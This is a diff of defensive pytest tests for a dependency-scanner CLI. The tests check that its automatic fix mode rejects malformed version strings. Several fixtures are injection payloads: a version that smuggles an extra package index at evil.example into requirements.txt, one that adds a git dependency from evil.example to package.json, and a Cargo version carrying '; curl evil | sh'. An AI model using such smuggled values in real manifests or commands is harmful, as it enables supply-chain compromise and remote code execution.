@@ -263,3 +263,64 @@ class TestNoTerminalEscapes:
             {"containerd_hosts_toml": "[host]\r\n  a = 1\x1b[2K\n", "note": "a\nb"}
         )
         assert payload == {"containerd_hosts_toml": "[host]\n  a = 1[2K\n", "note": "a b"}
+
+
+# --------------------------------------------------------------------------- #
+# --fix never writes a malformed version
+# --------------------------------------------------------------------------- #
+INJECTED_PYPI = "2.31.0\n--extra-index-url https://evil.example/simple"
+INJECTED_NPM = '4.17.21", "evil": "git+https://evil.example/x.git'
+
+
+class TestFixVersionsAreValidated:
+    def test_requirements_line_injection_is_refused(self, tmp_path):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\n")
+        text, changes = cli.plan_requirements_fix(req, {"requests": INJECTED_PYPI})
+        assert text == "requests==2.19.0\n" and changes == []
+
+    def test_package_json_key_injection_is_refused(self, tmp_path):
+        pj = tmp_path / "package.json"
+        original = '{\n  "dependencies": {\n    "lodash": "^4.17.0"\n  }\n}\n'
+        pj.write_text(original)
+        text, changes, _skipped = cli.plan_package_json_fix(pj, {"lodash": INJECTED_NPM})
+        assert text == original and changes == []
+
+    def test_valid_versions_still_apply(self, tmp_path):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\nDjango==4.2\n")
+        text, changes = cli.plan_requirements_fix(req, {"requests": "2.31.0", "django": "4.2.post1"})
+        assert text == "requests==2.31.0\nDjango==4.2.post1\n" and len(changes) == 2
+
+    def test_apply_fixes_writes_nothing_malformed(self, tmp_path, capsys, monkeypatch):
+        req = tmp_path / "requirements.txt"
+        req.write_text("requests==2.19.0\n")
+        monkeypatch.setattr(cli, "verify_fixes", lambda *a: [])
+        findings = [{"name": "requests", "version": "2.19.0", "fix_version": INJECTED_PYPI, "cves": [{}]}]
+        args = argparse.Namespace(dry_run=False, yes=True, insecure=False)
+        cli.apply_fixes(args, "https://reg.example", "t", tmp_path, [(req, "pypi", findings)])
+        assert req.read_text() == "requests==2.19.0\n"
+        assert "malformed fix version" in capsys.readouterr().err
+
+    def test_cargo_advice_never_prints_a_command_injection(self, tmp_path, capsys):
+        printed = cli._print_cargo_fix_advice(
+            tmp_path / "Cargo.lock",
+            [
+                {"name": "time", "fix_version": "0.3.47; curl evil | sh", "cves": [{}]},
+                {"name": "smallvec", "fix_version": "1.6.1", "cves": [{}]},
+            ],
+        )
+        out = capsys.readouterr().out
+        assert printed == 1
+        assert "curl" not in out and "cargo update -p smallvec --precise 1.6.1" in out
+
+
+class TestServerDropsMalformedFixVersions:
+    def test_lowest_clearing_version_skips_unparseable_fixes(self):
+        from app.services.vulns import lowest_clearing_version
+
+        cves = [{"fixed_version": INJECTED_PYPI}, {"fixed_version": "2.30.0"}]
+        assert lowest_clearing_version("pypi", cves, "2.19.0") == "2.30.0"
+        assert lowest_clearing_version("npm", [{"fixed_version": INJECTED_NPM}], "4.17.0") is None
+        assert lowest_clearing_version("cargo", [{"fixed_version": "1.0.0\n"}], "0.9.0") is None
+        assert lowest_clearing_version("npm", [{"fixed_version": "4.17.21"}], "4.17.0") == "4.17.21"
